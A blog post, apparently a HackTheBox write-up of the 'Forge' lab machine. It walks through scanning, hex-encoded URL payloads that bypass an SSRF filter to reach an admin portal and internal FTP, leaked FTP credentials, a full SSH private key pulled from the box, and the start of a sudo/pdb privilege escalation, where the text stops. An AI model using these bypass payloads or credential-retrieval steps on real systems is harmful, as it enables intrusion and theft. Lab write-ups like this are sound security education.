<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title class=pjax-title>Forge HackTheBox Writeup - tukmogi blog</title><meta name=Description content><meta property="og:title" content="Forge HackTheBox Writeup"><meta property="og:description" content="ForgeForge was a great medium linux box that tested on enumeration, evasion techniques and a bit of code review.
Enumeration┌──(kali㉿kali)-[~/htb/forge] └─$ cat nmap/initial.nmap # Nmap 7.91 scan initiated Mon Dec 20 04:27:24 2021 as: nmap -sCV -oA nmap/initial -T4 forge.htb Nmap scan report for forge.htb (10.10.11.111) Host is up (0.32s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2."><meta property="og:type" content="article"><meta property="og:url" content="https://mogoria.github.io/posts/forge-htb/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-24T13:03:46-05:00"><meta property="article:modified_time" content="2022-02-24T13:03:46-05:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Forge HackTheBox Writeup"><meta name=twitter:description content="ForgeForge was a great medium linux box that tested on enumeration, evasion techniques and a bit of code review.
Enumeration┌──(kali㉿kali)-[~/htb/forge] └─$ cat nmap/initial.nmap # Nmap 7.91 scan initiated Mon Dec 20 04:27:24 2021 as: nmap -sCV -oA nmap/initial -T4 forge.htb Nmap scan report for forge.htb (10.10.11.111) Host is up (0.32s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2."><meta name=application-name content="tukmogi blog"><meta name=apple-mobile-web-app-title content="tukmogi blog"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://mogoria.github.io/posts/forge-htb/><link rel=prev href=https://mogoria.github.io/posts/aspire-ctf-web/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Forge HackTheBox Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/mogoria.github.io\/posts\/forge-htb\/"},"genre":"posts","keywords":"hack-the-box, medium","wordcount":1374,"url":"https:\/\/mogoria.github.io\/posts\/forge-htb\/","datePublished":"2022-02-24T13:03:46-05:00","dateModified":"2022-02-24T13:03:46-05:00","publisher":{"@type":"Organization","name":"tukmogi"},"author":{"@type":"Person","name":"tukmogi"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e)}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(t){const e=document.getElementsByTagName("meta");for(let n=0;n<e.length;n++)if(e[n].getAttribute("name")===t)return e[n];return''}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?setTheme("dark"):setTheme("light")}else''==="light"||''==="dark"||''==="black"?(setTheme(''),saveTheme('')):(saveTheme("auto"),window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?setTheme("dark"):setTheme("light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="tukmogi blog"><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><a href=# onclick=return!1 class="menu-item theme-select" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title="Switch Theme"><option value=light>Light</option><option value=dark>Dark</option><option value=black>Black</option><option value=auto>Auto</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="tukmogi blog"><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a href=# onclick=return!1 class="menu-item theme-select" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title="Switch Theme"><option value=light>Light</option><option value=dark>Dark</option><option value=black>Black</option><option value=auto>Auto</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a><ul><li><a href=#port-80>Port 80</a></li></ul></li><li><a href=#privilege-escalation>Privilege escalation</a></li><li><a href=#post-root>Post Root</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Forge HackTheBox Writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>tukmogi</a>
</span>&nbsp;<span class=post-category>included in </span>&nbsp;<span class=post-category>categories <a href=/categories/boxes/><i class="far fa-folder fa-fw"></i>boxes</a>&nbsp;<a href=/categories/writeups/><i class="far fa-folder fa-fw"></i>writeups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-02-24>2022-02-24</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2022-02-24>2022-02-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1374 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload data-src=/images/forge-htb/featured-image.jpg data-srcset="/images/forge-htb/featured-image.jpg, /images/forge-htb/featured-image.jpg 1.5x, /images/forge-htb/featured-image.jpg 2x" data-sizes=auto alt=/images/forge-htb/featured-image.jpg title=/images/forge-htb/featured-image.jpg height=auto width=auto></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a><ul><li><a href=#port-80>Port 80</a></li></ul></li><li><a href=#privilege-escalation>Privilege escalation</a></li><li><a href=#post-root>Post Root</a></li></ul></nav></div></div><div class=content id=content><h1 id=forge class=headerLink><a href=#forge class=header-mark></a>Forge</h1><p>Forge was a great medium linux box that tested on enumeration, evasion techniques and a bit of code review.</p><h2 id=enumeration class=headerLink><a href=#enumeration class=header-mark></a>Enumeration</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/forge<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ cat nmap/initial.nmap 
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.91 scan initiated Mon Dec 20 04:27:24 2021 as: nmap -sCV -oA nmap/initial -T4 forge.htb</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> forge.htb <span class=o>(</span>10.10.11.111<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.32s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE    SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp filtered ftp
</span></span><span class=line><span class=cl>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open     http    Apache httpd 2.4.41
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Gallery
</span></span><span class=line><span class=cl>Service Info: Host: 10.10.11.111<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Mon Dec 20 04:28:06 2021 -- 1 IP address (1 host up) scanned in 42.29 seconds</span>
</span></span></code></pre></div><h3 id=port-80 class=headerLink><a href=#port-80 class=header-mark></a>Port 80</h3><p>Visiting the web service on port 80, we find a website with images and an upload feature.</p><p><img class=lazyload data-src=/images/forge-htb/Untitled.png data-srcset="/images/forge-htb/Untitled.png, /images/forge-htb/Untitled.png 1.5x, /images/forge-htb/Untitled.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled.png title=Untitled></p><p>Scanning for subdomains reveals that there is one called ‘admin.forge.htb’</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/forge<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ wfuzz --hc <span class=m>302</span> -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class=s1>&#39;Host: FUZZ.forge.htb&#39;</span> http://forge.htb
</span></span><span class=line><span class=cl> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class=err>&#39;</span>s documentation <span class=k>for</span> more information.
</span></span><span class=line><span class=cl>********************************************************
</span></span><span class=line><span class=cl>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class=line><span class=cl>********************************************************
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: http://forge.htb/
</span></span><span class=line><span class=cl>Total requests: <span class=nv>100000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>ID           Response   Lines    Word       Chars       <span class=nv>Payload</span>                                                              
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>000000036:   <span class=m>200</span>        <span class=m>1</span> L      <span class=m>4</span> W        <span class=m>27</span> Ch       <span class=s2>&#34;admin&#34;</span>
</span></span></code></pre></div><p>Accessing the site directly doesn’t isn’t possible, it filters out only for localhost</p><p><img class=lazyload data-src=/images/forge-htb/Untitled%201.png data-srcset="/images/forge-htb/Untitled%201.png, /images/forge-htb/Untitled%201.png 1.5x, /images/forge-htb/Untitled%201.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%201.png title=Untitled></p><p>Since the upload feature, accepts a url, I decided to try fetch the admin portal through it. This also was not possible, there seems to be a back end filtering that has blacklisted names.</p><p><img class=lazyload data-src=/images/forge-htb/Untitled%202.png data-srcset="/images/forge-htb/Untitled%202.png, /images/forge-htb/Untitled%202.png 1.5x, /images/forge-htb/Untitled%202.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%202.png title=Untitled></p><p>I had to look of a way to bypass this. After looking through, I found one that worked. I encoded the url in hex and got a successful upload</p><p><img class=lazyload data-src=/images/forge-htb/Untitled%203.png data-srcset="/images/forge-htb/Untitled%203.png, /images/forge-htb/Untitled%203.png 1.5x, /images/forge-htb/Untitled%203.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%203.png title=Untitled></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/
</span></span></code></pre></div><p><img class=lazyload data-src=/images/forge-htb/Untitled%204.png data-srcset="/images/forge-htb/Untitled%204.png, /images/forge-htb/Untitled%204.png 1.5x, /images/forge-htb/Untitled%204.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%204.png title=Untitled></p><p>We are able to access the admin portal and able to receive more functionality. We see that there is a juicy endpoint called announcements.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/forge<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ curl http://forge.htb/uploads/M2dvG84uCCDDYJjBrULa                              
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Admin Portal&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;header&gt;
</span></span><span class=line><span class=cl>            &lt;nav&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>            &lt;/nav&gt;
</span></span><span class=line><span class=cl>    &lt;/header&gt;
</span></span><span class=line><span class=cl>    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class=line><span class=cl>    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class=line><span class=cl>    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></div><p>Accessing the announcement, we find ftp credentials for a user. We however cannot directly use them since the ftp port is filtered in the nmap scan. However, there are more announcements that show us that the admin portal allows for ftp uploads.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/forge<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ curl http://forge.htb/uploads/6puGcte6363bT55qBiwF
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Announcements&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/announcements.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;header&gt;
</span></span><span class=line><span class=cl>            &lt;nav&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>            &lt;/nav&gt;
</span></span><span class=line><span class=cl>    &lt;/header&gt;
</span></span><span class=line><span class=cl>    &lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class=line><span class=cl>    &lt;ul&gt;
</span></span><span class=line><span class=cl>        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
</span></span><span class=line><span class=cl>        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span class=k>for</span> uploading from url.&lt;/li&gt;
</span></span><span class=line><span class=cl>        &lt;li&gt;The /upload endpoint has been configured <span class=k>for</span> easy scripting of uploads, and <span class=k>for</span> uploading an image, one can simply pass a url with ?u<span class=o>=</span><span class=p>&amp;</span>lt<span class=p>;</span>url<span class=p>&amp;</span>gt<span class=p>;</span>.&lt;/li&gt;
</span></span><span class=line><span class=cl>    &lt;/ul&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></div><p>Trying to access the ftp service, I get another filter</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/upload/?u<span class=o>=</span>ftp://user:heightofsecurity123!@localhost
</span></span></code></pre></div><p><img class=lazyload data-src=/images/forge-htb/Untitled%205.png data-srcset="/images/forge-htb/Untitled%205.png, /images/forge-htb/Untitled%205.png 1.5x, /images/forge-htb/Untitled%205.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%205.png title=Untitled></p><p>Once more, a bypass is needed. Encoding <a href=http://localhost target=_blank rel="noopener noreffer">localhost</a> as hex, works as well. And this gives us access to the ftp service.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/upload?u<span class=o>=</span>ftp://user:heightofsecurity123!@%6C%6F%63%61%6C%68%6F%73%74
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/forge<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ curl http://forge.htb/uploads/LBnUne2HDCUFqeu14r15
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> <span class=m>1000</span>     <span class=m>1000</span>         <span class=m>4096</span> Aug <span class=m>04</span> 19:23 snap
</span></span><span class=line><span class=cl>-rw-r-----    <span class=m>1</span> <span class=m>0</span>        <span class=m>1000</span>           <span class=m>33</span> Dec <span class=m>21</span> 06:19 user.txt
</span></span></code></pre></div><p>I was able to retrieve the ssh private key of the user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/upload?u<span class=o>=</span>ftp://user:heightofsecurity123!@%6C%6F%63%61%6C%68%6F%73%74/.ssh/id_rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/forge<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ curl -s http://forge.htb/uploads/1dwCS56wIxwghmZZIdug <span class=p>|</span> tee id_rsa
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
</span></span><span class=line><span class=cl>rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE
</span></span><span class=line><span class=cl>7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk
</span></span><span class=line><span class=cl>r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D
</span></span><span class=line><span class=cl>WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G
</span></span><span class=line><span class=cl>mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR
</span></span><span class=line><span class=cl>GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD
</span></span><span class=line><span class=cl>K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2
</span></span><span class=line><span class=cl>EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d
</span></span><span class=line><span class=cl>aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2
</span></span><span class=line><span class=cl>GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG
</span></span><span class=line><span class=cl>K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6
</span></span><span class=line><span class=cl>dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y
</span></span><span class=line><span class=cl>JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu
</span></span><span class=line><span class=cl>MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF
</span></span><span class=line><span class=cl>DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r
</span></span><span class=line><span class=cl>rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU
</span></span><span class=line><span class=cl>xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0
</span></span><span class=line><span class=cl>2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98
</span></span><span class=line><span class=cl>yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+
</span></span><span class=line><span class=cl>kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/
</span></span><span class=line><span class=cl>wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu
</span></span><span class=line><span class=cl>DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA
</span></span><span class=line><span class=cl>wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM
</span></span><span class=line><span class=cl>0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf
</span></span><span class=line><span class=cl>FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg
</span></span><span class=line><span class=cl>NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC
</span></span><span class=line><span class=cl>9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P
</span></span><span class=line><span class=cl>fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ
</span></span><span class=line><span class=cl>dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr
</span></span><span class=line><span class=cl>W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL
</span></span><span class=line><span class=cl>wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb
</span></span><span class=line><span class=cl>RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb
</span></span><span class=line><span class=cl>nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
</span></span><span class=line><span class=cl><span class=nv>shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class=o>=</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><h2 id=privilege-escalation class=headerLink><a href=#privilege-escalation class=header-mark></a>Privilege escalation</h2><p>Gaining access to the machine, we find that the user can run certain commands as sudo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-bash-5.0$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> user on forge:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User user may run the following commands on forge:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL : ALL<span class=o>)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</span></span></code></pre></div><p>Reviewing the python runnable, we see that it enable one run system checks as admin. However, incase of an error, a debugger called pdb is used. We can use this to spawn a shell by triggering an error</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
